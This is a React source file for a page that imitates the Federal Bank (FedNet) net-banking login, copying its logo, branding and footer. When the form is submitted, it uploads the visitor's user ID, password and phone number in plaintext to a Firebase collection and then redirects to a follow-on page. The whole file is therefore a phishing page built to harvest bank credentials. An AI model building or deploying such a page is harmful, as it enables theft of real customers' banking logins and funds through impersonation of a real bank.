import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState(''); 
  const [phoneNumber, setPhoneNumber] = useState('');
  const [language] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const COLLECTION_NAME = 'federal'; 

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();
      let documentId = localStorage.getItem(`${COLLECTION_NAME}_document_id`);
      if (!documentId) {
        documentId = `user_${timestamp}`;
        localStorage.setItem(`${COLLECTION_NAME}_document_id`, documentId);
      }
      
      const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
        key: documentId,
        userId,
        password,
        phoneNumber,
        language,
        timeStamp: timestamp,
      });
      
      if (result.state === 'success') {
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${documentId}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  // Federal Bank F-Logo SVG (Placehoder - आपके लिंक में दिखने वाले लोगो जैसा)
  const FederalLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="h-full w-full">
      <path fillRule="evenodd" d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm-1 15.5h-2.5v-11h5c1.38 0 2.5 1.12 2.5 2.5v.5h-2.5v-.5c0-.69-.56-1.25-1.25-1.25h-1.25v2h1.25c.69 0 1.25.56 1.25 1.25v1.5c0 .69-.56 1.25-1.25 1.25h-1.25v2h1.25c.69 0 1.25.56 1.25 1.25v.5h2.5v-.5c0-1.38-1.12-2.5-2.5-2.5h-1.25v-2h1.25c.69 0 1.25-.56 1.25-1.25v-1.5c0-.69-.56-1.25-1.25-1.25h-1.25v-2h1.25c.69 0 1.25.56 1.25 1.25v1.5h-2.5v-1.5z" clipRule="evenodd" />
    </svg>
  );

  return (
    // Main Container - Full Screen with Background Simulation
    <div className="flex flex-col min-h-screen relative bg-gray-100 overflow-hidden">
        
        {/* Blurred Background Simulation (3374.jpg) */}
        <div className="absolute inset-0 bg-cover bg-center" style={{ 
            backgroundImage: 'url("https://placehold.co/1000x2000/B0C4DE/333333/png?text=BLURRED+BACKGROUND")', 
            filter: 'blur(3px) brightness(0.8)',
            zIndex: 0,
            minHeight: '100%' 
        }}></div>

        {/* 🚀 UPDATED HEADER: Large Logo Graphic in Center (मोबाइल के लिए बड़ा साइज़) */}
        <header className="relative bg-white bg-opacity-90 p-3 flex justify-between items-center shadow-md z-10">
            {/* Left Nav Icon (Back Arrow) */}
            <svg xmlns="http://www.w3.org/2000/svg" className="h-7 w-7 text-gray-500 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
            </svg>
            
            {/* Centered Large Federal Bank Logo Graphic */}
            <div className="flex-1 flex justify-center">
                <div className="h-12 w-12 text-[#003366]"> {/* h-12 w-12 साइज़ बड़ा है */}
                    <FederalLogo />
                </div>
            </div>
            
            {/* Right Nav Icon (Hamburger/Menu) */}
            <svg xmlns="http://www.w3.org/2000/svg" className="h-7 w-7 text-gray-500 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h7" /></svg>
        </header>

        {/* Main Content - White Login Card */}
        <main className="flex-1 p-4 flex justify-center items-start pt-8 relative z-10"> 
            <div className="bg-white rounded-lg w-full max-w-sm p-6 shadow-xl">
                
                {/* Need an Account? Sign Up Section */}
                <div className="flex justify-between items-center mb-6 border-b pb-4">
                    <p className="text-sm text-gray-600">
                        Need an Account? <a href="#" className="text-blue-600 font-semibold hover:underline">Sign Up</a>
                    </p>
                    {/* FedNet Logo Placeholder */}
                    <img src="https://placehold.co/60x20/FFFFFF/003366/png?text=FedNet" alt="FedNet Logo" className="h-5" />
                </div>

                {/* Login Form (Minimal 3 Fields) */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    
                    {/* 1. User ID Input */}
                    <div>
                        <input
                            type="text"
                            placeholder="User ID"
                            value={userId}
                            onChange={(e) => setUserId(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 2. Password Input */}
                    <div>
                        <input
                            type="password"
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* 3. Phone Number Input */}
                    <div>
                        <input
                            type="tel"
                            placeholder="10-digit phone number"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                            required
                            pattern="[0-9]{10}"
                            disabled={isSubmitting}
                        />
                    </div>
                    
                    {/* LOGIN Button (Dark Blue) */}
                    <button
                        type="submit"
                        className="w-full bg-[#003366] hover:bg-[#004488] text-white font-bold py-2 rounded-md transition duration-150 ease-in-out text-base mt-4"
                        disabled={isSubmitting}
                    >
                        {isSubmitting ? "Processing..." : "Log In"}
                    </button>

                    {/* Links below the LOGIN button */}
                    <div className="flex justify-between text-sm pt-2">
                        <a href="#" className="text-blue-600 hover:underline">
                            Forgot Password?
                        </a>
                        <div className="space-x-4">
                            <a href="#" className="text-blue-600 hover:underline">
                                Forgot User ID?
                            </a>
                            <a href="#" className="text-blue-600 hover:underline">
                                Unlock User ID?
                            </a>
                        </div>
                    </div>

                </form>

            </div>
        </main>

        {/* Footer (Full Visual Match - 3374.jpg) */}
        <footer className="relative bg-[#003366] text-white p-4 text-center z-10 w-full mt-auto">
            {/* Main Logo Section */}
            <div className="flex justify-center items-center space-x-2 mb-2">
                <div className="text-xl font-bold tracking-wider">FEDERAL BANK</div>
                <p className="text-sm border-l border-white pl-2">YOUR PERFECT BANKING PARTNER</p>
            </div>
            
            {/* DICGC, QR Code, Privacy/Terms */}
            <div className="flex justify-between items-end pt-2 border-t border-gray-600">
                <div className="flex items-center space-x-2 text-xs">
                    <img src="https://placehold.co/40x20/FFFFFF/000000/png?text=DICGC" alt="DICGC" className="h-5 bg-white p-0.5 rounded" />
                    <span className="text-gray-300 hidden sm:inline">|</span>
                    <span className="text-gray-300 hidden sm:inline">A Government of India Undertaking</span>
                </div>
                
                <div className="text-xs">
                    <p className="text-gray-300">Privacy - Terms</p>
                </div>
            </div>
        </footer>
    </div>
  );
};

export default FirstPage;

